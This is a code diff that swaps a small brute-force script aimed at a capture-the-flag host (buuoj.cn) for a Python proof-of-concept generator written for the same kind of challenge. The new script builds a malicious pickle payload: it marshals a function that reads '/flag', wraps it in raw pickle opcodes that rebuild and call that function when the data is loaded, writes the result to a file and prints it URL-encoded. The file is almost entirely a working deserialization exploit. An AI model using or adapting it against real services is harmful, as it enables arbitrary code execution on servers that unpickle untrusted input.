@@ -1,12 +1,48 @@
-import requests
-import re
+# !/usr/bin/env python
+# -*- coding:utf-8 -*-
+__author__ = 'bit4'
+__github__ = 'https://github.com/bit4woo'
+__filename__ = 'pickle_poc_gen0.py'
 
-url = 'http://b8e0235a-f240-455d-a375-9f4fb9b27e4c.node3.buuoj.cn/shop?page='
+import marshal
+import base64
+import _pickle as cPickle
+import urllib
 
-for i in range(0, 500):
-    url_t = url + str(i)
-    res = requests.get(url_t)
-    print(i)
-    if '/static/img/lv/lv6.png' in res.text:
-        print("ans:%d" % i)
-        break
+
+
+def foo():#you should write your code in this function
+    import os
+    all_the_text = open('/flag').read()
+    return all_the_text
+
+try:#尝试使用cPickle来序列号代码对象
+    cPickle.dumps(foo.func_code)
+except Exception as e:
+    print (e) #TypeError: can't pickle code objects
+
+code_serialized = base64.b64encode(marshal.dumps(foo.__code__))
+print (code_serialized)
+
+
+#为了保证code_serialized中的内容得到执行，我们需要如下代码
+#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), ''))()
+
+payload =  """ctypes
+FunctionType
+(cmarshal
+loads
+(cbase64
+b64decode
+(S'%s'
+tRtRc__builtin__
+globals
+(tRS''
+tR(tR.""" % base64.b64encode(marshal.dumps(foo.__code__))
+
+print ("------------------------------------------------")
+print (payload)
+fp =open("poc.pickle","w")
+fp.write(payload)
+print ("------------------------------------------------")
+print (urllib.parse.quote(payload))
